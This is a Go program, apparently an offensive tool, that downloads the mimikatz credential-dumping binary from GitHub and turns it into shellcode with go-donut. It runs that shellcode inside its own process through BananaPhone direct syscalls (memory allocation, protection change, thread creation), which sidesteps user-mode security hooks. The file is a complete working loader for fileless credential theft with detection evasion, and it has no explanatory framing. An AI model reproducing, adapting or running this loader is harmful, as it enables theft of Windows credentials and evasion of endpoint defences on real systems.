package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"github.com/Binject/go-donut/donut"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

const originalURL = `https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200816/mimikatz_trunk.zip`

var prefix string

func init() {
	switch runtime.GOARCH {
	case "amd64":
		prefix = "x64"
	case "386", "amd64p32":
		prefix = "Win32"
	default:
		fmt.Println("This arch is not compatible with mimikatz")
		os.Exit(0)
	}
}

func checkFatalErr(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	var mimikatz []byte

	resp, err := http.Get(originalURL)
	checkFatalErr(err)
	zipFile, err := ioutil.ReadAll(resp.Body)
	checkFatalErr(err)
	zipReader, err := zip.NewReader(bytes.NewReader(zipFile), int64(len(zipFile)))
	checkFatalErr(err)
	for _, file := range zipReader.File {
		println(file.Name)
		if path.Join(prefix, "mimikatz.exe") != file.Name {
			continue
		}
		fileHandle, err := file.Open()
		checkFatalErr(err)
		defer fileHandle.Close()
		mimikatz, err = ioutil.ReadAll(fileHandle)
		checkFatalErr(err)
		break
	}

	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(mimikatz), &donut.DonutConfig{
		Arch:     donut.X84,
		Type:     donut.DONUT_MODULE_EXE,
		InstType: donut.DONUT_INSTANCE_PIC,
		Entropy:  donut.DONUT_ENTROPY_DEFAULT,
		Compress: 1,
		Format:   1,
		Bypass:   3,
	})

	bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	checkFatalErr(err)

	alloc, err := bp.GetSysID("NtAllocateVirtualMemory")
	checkFatalErr(err)
	protect, err := bp.GetSysID("NtProtectVirtualMemory")
	checkFatalErr(err)
	createthread, err := bp.GetSysID("NtCreateThreadEx")
	checkFatalErr(err)

	// create thread on shellcode
	const (
		//special macro that says 'use this thread/process' when provided as a handle.
		thisThread = uintptr(0xffffffffffffffff)
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode.Bytes()))
	_, err = bananaphone.Syscall(
		alloc, //ntallocatevirtualmemory
		thisThread,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	checkFatalErr(err)

	bananaphone.WriteMemory(shellcode.Bytes(), baseA)

	var oldprotect uintptr
	_, err = bananaphone.Syscall(
		protect, //NtProtectVirtualMemory
		thisThread,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	checkFatalErr(err)

	var hhosthread uintptr
	_, err = bananaphone.Syscall(
		createthread,                         //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		thisThread,                           //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)

	_, err = syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	checkFatalErr(err)

	// bit of a hack because dunno how to wait for bananaphone background thread to complete...
	for {
		time.Sleep(1000000000)
	}
}
